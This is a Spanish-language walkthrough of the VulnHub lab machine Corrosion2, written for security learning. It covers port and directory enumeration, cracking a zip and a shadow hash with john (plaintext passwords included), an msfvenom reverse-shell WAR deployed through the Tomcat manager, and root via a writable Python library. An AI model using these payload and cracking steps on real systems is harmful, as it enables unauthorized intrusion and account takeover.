---
layout: single
title: Corrosion2 - VulnHub
excerpt: "Corrosion2, una máquina vulnerable de VulnHub, presenta una vulnerabilidad que expone un archivo zip con archivos de configuración. Aprovechamos uno de esos archivos para ingresar a Tomcat y obtener acceso. Posteriormente, la escalada de privilegios se produce debido a la reutilización de contraseñas y una gestión deficiente de los permisos en archivos"
date: 2023-11-11
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - cracking
  - HijackingLibrary
---

![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)

Corrosion2, una máquina vulnerable de VulnHub, presenta una vulnerabilidad que expone un archivo zip con archivos de configuración. Aprovechamos uno de esos archivos para ingresar a Tomcat y obtener acceso. Posteriormente, la escalada de privilegios se produce debido a la reutilización de contraseñas y una gestión deficiente de los permisos en archivos.

## Enumeracion

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Wed Nov  8 05:45:42 2023 as: nmap -sCV -p22,80,8080 -oN vulnscan.nmap 192.168.56.23
Nmap scan report for 192.168.56.23
Host is up (0.00026s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6ad8446080397ef02d082fe58363f070 (RSA)
|   256 f2a662d7e76a94be7b6ba512692efed7 (ECDSA)
|_  256 28e10d048019be44a64873aae86a6544 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.53
MAC Address: 08:00:27:DB:F0:36 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  8 05:45:50 2023 -- 1 IP address (1 host up) scanned in 8.00 seconds
```


## Analisis 

En el puerto 80(HTTP) localizamos un servidor web corriendo apache2, la parte inicial de la web no es mas que un archivo default.


![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-default.png)

Presiento que por esta ruta no encontraré nada, así que avanzaré hacia el puerto 8080.

### Puerto 8080

Si analizamos el puerto 8080(HTTP) podemos intuir que esta corriendo TOMCAT.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-tomcat.png)

Procedo a realizar un FUZZING para ver si encontramos algo interesante.


```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.23:8080/FUZZ -e .php,.txt,.html -t 200 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.23:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 160ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
                        [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 119ms]
RELEASE-NOTES.txt       [Status: 200, Size: 6898, Words: 862, Lines: 175, Duration: 32ms]
:: Progress: [882184/882184] :: Job [1/1] :: 3891 req/sec :: Duration: [0:04:34] :: Errors: 0 ::
```

En el archivo readme.txt solamente nos notifican lo siguiente:

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-readme.png)


Esta información no resulta útil para continuar avanzando. Por lo tanto, procedo a realizar fuzzing con otras extensiones, ya que previamente utilicé un diccionario más amplio y no encontré ninguna información adicional. En este intento, hemos encontrado algo interesante.

```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.23:8080/FUZZ -e .zip,.tar,.bak -t 200 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.23:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .zip .tar .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 97ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 93ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
```

También lo hubiésemos podido encontrar con el script vuln de nmap.

```bash
# Nmap 7.93 scan initiated Wed Nov  8 07:56:13 2023 as: nmap -p22,80,8080 --script vuln -oN scriptVuln.nmap 192.168.56.23
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.23
Host is up (0.00039s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
8080/tcp open  http-proxy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|   /backup.zip: Possible backup
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
MAC Address: 08:00:27:DB:F0:36 (Oracle VirtualBox virtual NIC)

# Nmap done at Wed Nov  8 07:57:24 2023 -- 1 IP address (1 host up) scanned in 70.92 seconds
```


Nos  descargamos el archivo.

```bash

wget http://192.168.56.23:8080/backup.zip
```

Al momentos de descomprimirlo notamos que nos solicita una contraseña.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-unzip.png)

Vamos a emplear la herramienta de JOHN llamada zip2john, la cual nos permitirá extraer el HASH de la contraseña que se nos solicita. La captura está destinada a indicar la sección que nos interesa.

```bash
zip2john backup.zip        
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.policy PKZIP Encr: 2b chk, TS_chk, cmplen=2911, decmplen=13052, crc=AD0C6FDB
ver 2.0 efh 5455 efh 7875 backup.zip/context.xml PKZIP Encr: 2b chk, TS_chk, cmplen=721, decmplen=1400, crc=59B9F4E7
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.properties PKZIP Encr: 2b chk, TS_chk, cmplen=2210, decmplen=7276, crc=1CD3C095
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xml PKZIP Encr: 2b chk, TS_chk, cmplen=626, decmplen=1149, crc=748A87A6
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xsd PKZIP Encr: 2b chk, TS_chk, cmplen=862, decmplen=2313, crc=3B44D150
ver 2.0 efh 5455 efh 7875 backup.zip/logging.properties PKZIP Encr: 2b chk, TS_chk, cmplen=1076, decmplen=4144, crc=1D6C26F7
ver 2.0 efh 5455 efh 7875 backup.zip/server.xml PKZIP Encr: 2b chk, TS_chk, cmplen=2609, decmplen=7589, crc=F91AC0C0
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xml PKZIP Encr: 2b chk, TS_chk, cmplen=1167, decmplen=2972, crc=BDCB08B9
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xsd PKZIP Encr: 2b chk, TS_chk, cmplen=858, decmplen=2558, crc=E8F588C2
ver 2.0 efh 5455 efh 7875 backup.zip/web.xml PKZIP Encr: 2b chk, TS_chk, cmplen=18917, decmplen=172359, crc=B8AF6070
backup.zip:$pkzip2$3*2*1*0*8*24*1cd3*6920*7046a2cc2a19fdf9e44c52bdd3b1a9d458ca7e751d2ec883c4d808c79087fb2606344d59*1*0*8*24*ad0c*6920*e4e89604a186ef8b495e481d5bb96c9397c973850a9829958567ab9c2d2bd2e0b8b1433d*2*0*272*47d*748a87a6*17dd*4e*8*272*748a*6920*502768ce9a11db8105560cdc8ea3b12cb91e5fa10d15b79fdc5335826c2f4a6e4112818ff5cce6e766548eef59eafabd29a2c2de3308487c980603b3867bb62bb60e65451a1fd9bb068ff01a4c2e98a8bbb56dd0f392338b147324bbd34ab2e63d2b80882029705f3803ead22980591ea52cab28fad58ad94838283fd7e267478f9a3e7f645f60ca4d0a227cef99c3db46184f8521dc4dd30f4102ad006dd04a7d054a9018f55730511ccd34bd15a50ebbd1012d4ba320b23fa925ede6d62e3929c137b959813290f0bf0e2a9ca075d1b6b511fb525a5289c32d29365132e25432f855f982f37e4a5fde6901e8f889218d987067920133a4b26ceecc5f3d28f40cb33601cff6f803b0eb900a183ef9e13d7e888fc9770fdb9d01ced0c6969f5df03fdce418da1d979220b430bee9dc21fa63f33b2c1f7b99f848ca5b618d0b6d6eb56ec3748595f1ca1c01492d6464fd1cf73ecd92b6bea1bccc9b8795b1d6087e9205b8e6c5122f83e3625c145b563e1763578d002e0feea455a19d74831c64f69440a3cbcb7b679f683c238984873b7a80df997f11e5d924fe98d1baef30bfce5efb613e82eab136e3844b0e326508b1dac80b2f863b35efdbfa95138d9994699da813c8bb8bc4e7c885b851db53f85d8f1d39f32dfda36477a64821ea03e444866882c6b64d446feb650780e26fab3701fd0743ac26cacefde996ccfe538776ea101c1d3aec81660613bd65eb34569139ee0845e7f7d1e8b12f8ed43ef58e9580c58ab2cfe170981c72256b4b12cc152771546d0ea9077d368c3ddc2c63819b00b3dd3581ab8908561cd8ad722c21d9a891922d8b52444f4fca9278a1a96e926cf19125ec20a327e8a3ab0aa2b05d4348*$/pkzip2$::backup.zip:jaspic-providers.xml, catalina.properties, catalina.policy:backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

La única parte que nos interesa es la siguiente

```bash
backup.zip:$pkzip2$3*2*1*0*8*24*1cd3*6920*7046a2cc2a19fdf9e44c52bdd3b1a9d458ca7e751d2ec883c4d808c79087fb2606344d59*1*0*8*24*ad0c*6920*e4e89604a186ef8b495e481d5bb96c9397c973850a9829958567ab9c2d2bd2e0b8b1433d*2*0*272*47d*748a87a6*17dd*4e*8*272*748a*6920*502768ce9a11db8105560cdc8ea3b12cb91e5fa10d15b79fdc5335826c2f4a6e4112818ff5cce6e766548eef59eafabd29a2c2de3308487c980603b3867bb62bb60e65451a1fd9bb068ff01a4c2e98a8bbb56dd0f392338b147324bbd34ab2e63d2b80882029705f3803ead22980591ea52cab28fad58ad94838283fd7e267478f9a3e7f645f60ca4d0a227cef99c3db46184f8521dc4dd30f4102ad006dd04a7d054a9018f55730511ccd34bd15a50ebbd1012d4ba320b23fa925ede6d62e3929c137b959813290f0bf0e2a9ca075d1b6b511fb525a5289c32d29365132e25432f855f982f37e4a5fde6901e8f889218d987067920133a4b26ceecc5f3d28f40cb33601cff6f803b0eb900a183ef9e13d7e888fc9770fdb9d01ced0c6969f5df03fdce418da1d979220b430bee9dc21fa63f33b2c1f7b99f848ca5b618d0b6d6eb56ec3748595f1ca1c01492d6464fd1cf73ecd92b6bea1bccc9b8795b1d6087e9205b8e6c5122f83e3625c145b563e1763578d002e0feea455a19d74831c64f69440a3cbcb7b679f683c238984873b7a80df997f11e5d924fe98d1baef30bfce5efb613e82eab136e3844b0e326508b1dac80b2f863b35efdbfa95138d9994699da813c8bb8bc4e7c885b851db53f85d8f1d39f32dfda36477a64821ea03e444866882c6b64d446feb650780e26fab3701fd0743ac26cacefde996ccfe538776ea101c1d3aec81660613bd65eb34569139ee0845e7f7d1e8b12f8ed43ef58e9580c58ab2cfe170981c72256b4b12cc152771546d0ea9077d368c3ddc2c63819b00b3dd3581ab8908561cd8ad722c21d9a891922d8b52444f4fca9278a1a96e926cf19125ec20a327e8a3ab0aa2b05d4348*$/pkzip2$::backup.zip:jaspic-providers.xml, catalina.properties, catalina.policy:backup.zip
```

Procedemos a crackearlo.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash       
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
@administrator_hi5 (backup.zip)
1g 0:00:00:01 DONE (2023-11-09 14:22) 0.6535g/s 7512Kp/s 7512Kc/s 7512KC/s @b00d@!m@l..:kso6d
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ahora procedemos a descomprimirlo y parece que se trata de un listado de archivos de configuración del servicio TOMCAT.

```bash
unzip backup.zip 
Archive:  backup.zip
[backup.zip] catalina.policy password: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml
```

Si le hacemos un cat al archivo **tomcat-users.xml** podemos notar credenciales para logearnos al servicio TOMCAT 

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-credenciales.png)


Nos dirigimos al servicio TOMCAT, y ingresamos a la ruta manager y depositamos las credenciales.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-tomcatLogin.png)


## Shell - Tomcat 

Nos creamos un war malicioso para poder ingresar al sistema.


```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443 -f war -o cxshell.war
Payload size: 13318 bytes
Final size of war file: 13318 bytes
Saved as: cxshell.war
```

Ahora lo subimos


![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-upload.png)

Nos ponemos en escucha y hacemos click en nuestro archivo.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-click.png)

Una vez adentro probamos si se están reutilizando credenciales para usuarios que formen parte del sistema. Se reutilizan credenciales.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-jaye.png)

Listamos archivos SUID y vemos algo interesante.


![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-suid.png)

Si buscamos el binario en gtfobins nos informamos que podemos leer cual quier archivo como root en el sistema.


![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-gtfbins.png)

 Estamos con lo correcto.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-shadow.png)

Pero esto no es suficiente; necesitamos obtener una shell como root. Después de buscar durante un buen tiempo, no encontré ninguna ruta alternativa. La única opción es realizar un ataque de fuerza bruta para crackear el hash de 'randy'.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-hash.png)

Copiamos el hash y lo decodficamos con john.

```bash
➜  content john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:04:15 2,46% (ETA: 13:45:40) 0g/s 1608p/s 1608c/s 1608C/s kababayan..juanita10
0g 0:00:21:34 12,76% (ETA: 13:41:53) 0g/s 1555p/s 1555c/s 1555C/s babe182..bUSTER
0g 0:00:25:30 15,08% (ETA: 13:42:04) 0g/s 1560p/s 1560c/s 1560C/s 1056905..1042530
0g 0:01:58:52 77,06% (ETA: 13:27:11) 0g/s 1548p/s 1548c/s 1548C/s JOHANA1..JOELANGEL
07051986randy    (randy)
1g 0:02:29:23 DONE (2023-11-08 13:22) 0.000111g/s 1554p/s 1554c/s 1554C/s 070552898..070488m
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Una vez crackeeado iniciamos con randy y vemos que tiene permiso como root para el siguiente archivo.


![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-sudoes.png)

 Listamos el archivo y ubicamos donde esta la librería que utiliza.


![](/assets/images/vulnhub-writeup-corrosion2/corrosion-codigo.png)

Obviamente hay que ver los permisos del archivo base64.py pero de la version que corresponde en este caso seria del python3.8

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-permisos.png)

Al tener acceso de escritura, pasamos a escribir código malicioso en la función b64encode. Agregamos la librería os y en la función encode escribimos lo siguiente.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-libreriaCodigo.png)

Tenemos root.

![](/assets/images/vulnhub-writeup-corrosion2/corrosion2-root.png)
